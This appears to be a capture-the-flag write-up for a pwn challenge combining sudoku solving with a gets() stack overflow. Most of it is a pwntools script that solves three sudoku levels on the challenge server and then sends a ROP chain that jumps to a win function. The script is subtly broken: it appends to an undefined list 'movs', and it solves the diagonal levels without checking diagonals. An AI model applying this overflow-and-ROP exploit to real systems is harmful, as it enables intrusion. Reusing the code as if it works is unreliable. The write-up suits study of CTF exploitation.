# It's time to play

```python
			Challenge - 1 Solves
		       It's Time to Play - 1000

Take your time to solve this amazing sudoku puzzle
nc 128.199.157.172 25452
Alternate download link:
https://drive.google.com/file/d/1DDKykmpydW0vtMB14CEDwXokEX6cBn-J/view?usp=sharing


```

- :k<
- There is obvious stack buffer overflow because of call to gets().
- But to reach to that function. We have to solve three level of sudoku.
- So i quickly got some script from github and made a parser to parse the sudoku.
- I had to make few changes to the solver and the third level took me lots of time.
- THis challenge should be in MISC-PWN instead of pwn :/

- Only i was able to solve this challenge during ctf. This wasn't that hard.

#### First blood

#### Exploit
```python
#!/usr/bin/python3
from pwn import *

####Addr
pop_rdi = 0x00401723
pop_rsi = 0x00401721
win = 0x401296

####Globals
fuck = []
for fuck1 in [-2, -1, 1, 2]:
	for fuck2 in [-2, -1, 1, 2]:
		if abs(fuck1) != abs(fuck2):
			movs.append((fuck1,fuck2))

####Utils
def parsesudoku():
	sudoku_grids = []
	grid = []
	sudoku = io.recvuntil("Answer")[:-6]
	for each in sudoku.split(b"\n"):
		print(each)
	empty = False
	for each in sudoku.split(b"\n"):
		for _ in each.replace(b"|",b"").replace(b" ",b""):
			if chr(_) == "-" or chr(_) == "":
				empty = True
				continue
			grid.append(chr(_))
		if empty==True:
			pass
		else:
			sudoku_grids.append(grid)
		empty = False
		grid=[]
	return sudoku_grids

def solve(bo,fuck=False):
    find = find_empty(bo)
    if not find:
        return True
    else:
        row, col = find
    for i in range(1,10):
        if fuck==False:
            if valid(bo, i, (row, col)):
                bo[row][col] = i
                if solve(bo):
                    return True
        else:
            if valid3(bo,i,(row,col)):
                bo[row][col] = i
                if solve(bo,fuck=True):
                    return True
        bo[row][col] = 0
    return False

def valid(bo, num, pos):
    for i in range(len(bo[0])):
        if bo[pos[0]][i] == num and pos[1] != i:
            return False
    for i in range(len(bo)):
        if bo[i][pos[1]] == num and pos[0] != i:
            return False
    box_x = pos[1] // 3
    box_y = pos[0] // 3
    for i in range(box_y*3, box_y*3 + 3):
        for j in range(box_x * 3, box_x*3 + 3):
            if bo[i][j] == num and (i,j) != pos:
                return False

    return True



def valid3(bo, num, pos):
    for i in range(len(bo[0])):
        if bo[pos[0]][i] == num and pos[1] != i:
            return False
    for i in range(len(bo)):
        if bo[i][pos[1]] == num and pos[0] != i:
            return False
    box_x = pos[1] // 3
    box_y = pos[0] // 3
    for i in range(box_y*3, box_y*3 + 3):
        for j in range(box_x * 3, box_x*3 + 3):
            if bo[i][j] == num and (i,j) != pos:
                return False
    for fuckx, fucky in fuck:
        x = pos[0] + fuckx
        y = pos[1] + fucky
        if 0 <= x < 9 and 0 <= y < 9:
            if bo[x][y] == num:
                return False
    return True


def find_empty(bo):
    for i in range(len(bo)):
        for j in range(len(bo[0])):
            if bo[i][j] == 0:
                return (i, j)
    return None

def replacetozero(sudoku):
	new_sudoku = []
	s = []
	x = 0
	y = 0
	letters = {}
	for each_list in sudoku:
		for each in each_list:
			if ord(each) >= 0x41 and ord(each) <= 0x48:
				d = [x,y]
				letters[each]=d
				each = 0
			s.append(int(each))
			y += 1
		new_sudoku.append(s)
		s = []
		y = 0
		x += 1
	return new_sudoku,letters

def getanswer(sudoku,data):
	answer = ""
	for i in sorted(data.keys()):
		x = data[i][0]
		y = data[i][1]
		answer += str(sudoku[x][y])
	return answer

####Exploit
#io = process(["./rop_sudoku"])
io = remote("128.199.157.172",25452)
io.recvuntil("Level 1 : Normal sudoku\n\n")
sudoku1 = parsesudoku()[:-1]
sudoku1,data1 = replacetozero(sudoku1)
solve(sudoku1)
answer_1 = getanswer(sudoku1,data1)
for each in sudoku1:
	print(each)
io.sendline(answer_1)
io.recvuntil("Level 1 : Normal sudoku\n\n")
sudoku2 = parsesudoku()[:-1]
sudoku2,data2 = replacetozero(sudoku2)
solve(sudoku2)
answer_2 = getanswer(sudoku2,data2)
io.sendline(answer_2)
io.recvuntil("Level 2 : Diagonal sudoku\n\n")
sudoku3 = parsesudoku()[:-1]
sudoku3,data3 = replacetozero(sudoku3)
solve(sudoku3)
answer_3 = getanswer(sudoku3,data3)
io.sendline(answer_3)
io.recvuntil("Level 2 : Diagonal sudoku\n\n")
sudoku4 = parsesudoku()[:-1]
sudoku4,data4 = replacetozero(sudoku4)
solve(sudoku4)
answer_4 = getanswer(sudoku4,data4)
io.sendline(answer_4)
io.recvuntil("Level 2 : Diagonal sudoku\n\n")
sudoku5 = parsesudoku()[:-1]
sudoku5,data5 = replacetozero(sudoku5)
solve(sudoku5)
answer_5 = getanswer(sudoku5,data5)
io.sendline(answer_5)
print("Solving third one")
io.recvuntil("Level 3 : Diagonal with anti-knight move sudoku\n\n")
pause()
sudoku6 = parsesudoku()[:-1]
sudoku6,data6 = replacetozero(sudoku6)
solve(sudoku6,fuck=True)
answer6 = getanswer(sudoku6,data6)
print(answer6)
io.sendline(answer6)
io.recvuntil("Level 3 : Diagonal with anti-knight move sudoku\n\n")
pause()
sudoku7 = parsesudoku()[:-1]
sudoku7,data7 = replacetozero(sudoku7)
solve(sudoku7,fuck=True)
answer7 = getanswer(sudoku7,data7)
io.sendline(answer7)
io.recvuntil("Level 3 : Diagonal with anti-knight move sudoku\n\n")
sudoku8 = parsesudoku()[:-1]
sudoku8,data8 = replacetozero(sudoku8)
solve(sudoku8,fuck=True)
answer8 = getanswer(sudoku8,data8)
io.sendline(answer8)
pause()
io.recv()
L_ROP = b"A"*0x10+\
	p64(pop_rdi)+p64(0xbeefdeaddeadbeef)+\
	p64(pop_rsi)+p64(0xdeadbeefbeefdead)+p64(0x0)+\
	p64(win)
io.sendline(L_ROP)
io.interactive()
```
